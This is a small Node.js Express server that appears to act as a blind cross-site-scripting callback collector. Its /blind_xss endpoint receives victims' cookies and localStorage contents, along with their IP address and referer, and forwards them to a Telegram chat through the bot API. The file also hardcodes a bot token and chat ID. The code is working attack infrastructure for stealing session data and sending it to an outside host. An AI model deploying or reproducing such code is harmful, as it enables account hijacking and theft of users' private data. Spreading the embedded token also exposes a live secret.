const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = 1337;
const key= '6189299242:AAECvqdhPdW4SzRyxtAvhXH9FV8MUS-it4Q';
const user = 192408516;
app.get('/blind_xss', async (req, res) => {
    const cookie = req.query?.cookie;
    const localStorage = req.query?.localStorage;
    const referer =  req.headers?.referrer || req.headers?.referer;
    const ip = req?.headers?.['x-forwarded-for'] || req.socket?.remoteAddress

    let text = `
    **Fire blind xss callback.**
    ${ip}
    ${cookie ? 'cookie:'+cookie: ''}
    ${localStorage ? 'localStorage:'+localStorage: ''}
    ${referer ? 'referer:'+referer: ''}
    `;

    let searchQuery = `chat_id=${user}&disable_web_page_preview=1&parse_mode=html&text=${text}`;
    let url = `https://api.telegram.org/bot${key}/sendMessage?${searchQuery}`;
    await fetch(url);
});

app.use(express.static('public'))

app.listen(port, '0.0.0.0');
